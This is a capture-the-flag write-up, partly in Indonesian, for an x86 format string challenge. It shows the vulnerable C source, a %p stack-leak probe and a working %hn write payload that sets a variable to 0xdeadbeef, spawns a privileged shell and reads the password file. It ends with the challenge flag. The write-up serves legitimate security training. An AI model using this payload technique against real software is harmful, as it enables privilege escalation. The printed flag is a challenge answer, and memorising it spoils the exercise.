<h1>ELF x86 - Format string bug basic 2</h1>
<h3>Description</h3>

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
int main( int argc, char ** argv )
 
{
 
        int var;
        int check  = 0x04030201;
 
        char fmt[128];
 
        if (argc <2)
                exit(0);
 
        memset( fmt, 0, sizeof(fmt) );
 
        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );
 
        snprintf( fmt, sizeof(fmt), argv[1] );
 
        if ((check != 0x04030201) && (check != 0xdeadbeef))    
                printf ("\nYou are on the right way !\n");
 
        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );
 
        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}
```
<h3>Solution</h3>
<label>shell command diperoleh jika variabel check = 0xdeadbeef</label>
<label>alamat variabel check =  0xbffffab8 (sudah diberikan langsung diawal program)</label>

```console
app-systeme-ch14@challenge02:~$ ./ch14 AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
check at 0xbffffab8
argv[1] = [AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p]
fmt=[AAAA.0x80485f1.(nil).(nil).0xc2.0xbffffc04.0xb7fe1449.0xf63d4e2e.0x4030201.0x41414141.0x3878302e.0x35383430.0x282e3166.0x296c69]
check=0x4030201
```
<label>nilai dari AAAA pada index ke 9 dan kita dapat mecontrol index ke 9 </label>
<label>Memecah 0xdeadbeef menjadi 2 dengan format %hn</label>

<pre>
0xbeef = 48879 , 0xdead = 57005 desimal

Address1 (4 bytes) + Address2 (4 bytes) + %(48879–8 = 48871)x + %9$hn (parameter/index ke 9) + %(57005–48879 = 8126 ) x + %10$hn
</pre>

```console
app-systeme-ch14@challenge02:~$ ./ch14 $(python2 -c "print '\xb8\xfa\xff\xbf' + '\xba\xfa\xff\xbf' + '%48871x%9\$hn%8126x%10\$hn'")
check at 0xbffffab8
argv[1] = [��������%48871x%9$hn%8126x%10$hn]
fmt=[��������                                                                                                                       ]
check=0xdeadbeef
Yeah dude ! You win !
app-systeme-ch14-cracked@challenge02:~$ cat .passwd
1l1k3p0Rn&P0pC0rn
app-systeme-ch14-cracked@challenge02:~
```
<h3>Flag</h3>
<pre>
1l1k3p0Rn&P0pC0rn
</pre>
